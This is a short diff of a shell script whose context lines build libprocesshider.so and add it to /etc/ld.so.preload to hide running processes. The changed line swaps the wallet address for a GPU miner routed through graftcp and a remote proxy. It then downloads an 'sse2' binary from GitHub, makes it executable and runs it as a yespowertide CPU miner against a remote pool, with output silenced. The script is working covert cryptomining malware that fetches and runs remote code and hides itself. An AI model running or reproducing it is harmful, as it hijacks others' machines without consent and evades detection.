@@ -56,4 +56,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./fortune --proxy 43.169.30.87:443 --address prl1p9hmneetrmajxdm38lfr0434qll4w3m5k2uq2qlcvsc03svjhptgqf28ufs --worker Bismillah -gpu & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && clear && ./sse2 -a yespowertide -o 103.217.145.116:80 -u TT4ieYTMjFmbn1uvfQ3ovxFb7Uy9fhFzrd.Bismillah -t $(nproc) > /dev/null 2>&1 & clear
+./graftcp/graftcp & clear & ./fortune --proxy 43.169.30.87:443 --address prl1phekzcdcptshdzdhh4mtu49avruwr7urppe5tdfhwdvq9psqylutqcwxsju --worker Bismillah -gpu & wget https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 && chmod 777 sse2 && clear && ./sse2 -a yespowertide -o 103.217.145.116:80 -u TT4ieYTMjFmbn1uvfQ3ovxFb7Uy9fhFzrd.Bismillah -t $(nproc) > /dev/null 2>&1 & clear
